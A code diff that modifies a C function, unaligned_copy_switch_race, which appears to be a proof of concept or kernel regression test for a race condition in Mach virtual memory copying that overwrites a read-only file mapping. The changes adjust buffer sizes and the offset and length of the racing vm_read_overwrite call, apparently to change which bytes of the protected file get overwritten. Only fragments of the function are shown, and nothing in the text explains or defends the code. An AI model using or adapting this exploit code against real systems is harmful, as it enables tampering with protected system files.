@@ -118,7 +118,7 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
 		munmap(file_mapped, ctx->obj_size);
 		return true;
 	}
-	ro_addr = file_mapped;
+	ro_addr = (vm_address_t)file_mapped;
 
 	ctx->e0 = 0;
 	ctx->running_sem = dispatch_semaphore_create(0);
@@ -196,13 +196,13 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
 	/* allocate a source buffer for the unaligned copy */
 	kr = vm_allocate(mach_task_self(),
 	    &e5,
-	    ctx->obj_size,
+	    ctx->obj_size * 2,
 	    VM_FLAGS_ANYWHERE);
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
 	/* initialize to 'C' */
-	memset((char *)e5, 'C', ctx->obj_size);
+	memset((char *)e5, 'C', ctx->obj_size * 2);
 
-	char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
+	char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - 1);
 	memcpy(e5_overwrite_ptr, overwrite_data, overwrite_length);
 
 	int overwrite_first_diff_offset = -1;
@@ -299,8 +299,8 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
 		/* trigger copy_unaligned while racing with other thread */
 		kr = vm_read_overwrite(mach_task_self(),
 		    e5,
-		    ctx->obj_size,
-		    e2 + overwrite_length,
+		    ctx->obj_size - 1 + overwrite_length,
+		    e2 + 1,
 		    &copied_size);
 		T_QUIET;
 		T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
@@ -350,7 +350,7 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_ro)");
 	kr = vm_deallocate(mach_task_self(), ro_addr, ctx->obj_size);
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
-	kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
+	kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size * 2);
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");
 
 #if 0
